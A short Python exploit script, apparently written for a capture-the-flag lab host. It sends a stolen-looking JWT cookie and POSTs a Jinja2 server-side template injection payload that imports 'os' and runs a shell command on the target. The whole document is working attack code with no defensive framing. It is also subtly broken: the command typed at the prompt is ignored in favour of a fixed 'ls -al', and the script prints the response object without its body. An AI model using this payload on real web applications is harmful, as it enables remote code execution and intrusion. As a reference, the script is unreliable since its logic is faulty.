#!/usr/bin/env python3

import requests

url = "http://10.10.10.96:8080/"
headers = {"Content-Type":"application/x-www-form-urlencoded", "Cookie":"token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IndpemFyZC5veiIsImV4cCI6MTY0Njg1OTM4NH0.Aq530sAWVWY6PyyHtR1w2dPznOzXXnTrQ0LJvlbpeDI"}

while True:
    cmd = input("# ")
    data = {"name":"={{request.application.__globals__.__builtins__.__import__('os').popen('ls -al').read()}}&desc="}
    req = requests.post(url, headers=headers, data=data)
    print(req)
